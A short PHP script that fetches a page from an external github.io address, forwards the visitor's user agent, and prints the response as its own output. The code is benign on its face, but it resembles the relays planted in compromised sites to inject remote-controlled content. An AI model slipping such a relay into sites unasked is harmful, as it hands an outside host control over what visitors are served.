
<?php

$url = "https://ihusiyuqe71.github.io/"; // external site
$useragent = $_SERVER['HTTP_USER_AGENT'];
$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,       
    CURLOPT_FOLLOWLOCATION => true,        
    CURLOPT_MAXREDIRS      => 5,
    CURLOPT_CONNECTTIMEOUT => 10,          
    CURLOPT_TIMEOUT        => 30,          
    CURLOPT_USERAGENT      => $useragent,
    CURLOPT_SSL_VERIFYPEER => true,
    CURLOPT_SSL_VERIFYHOST => 2,
]);

$response = curl_exec($ch);

// Error handling
if ($response === false) {
    $error = curl_error($ch);
    $errno = curl_errno($ch);
    curl_close($ch);
    die("cURL error ({$errno}): {$error}");
}
echo $response;
?>
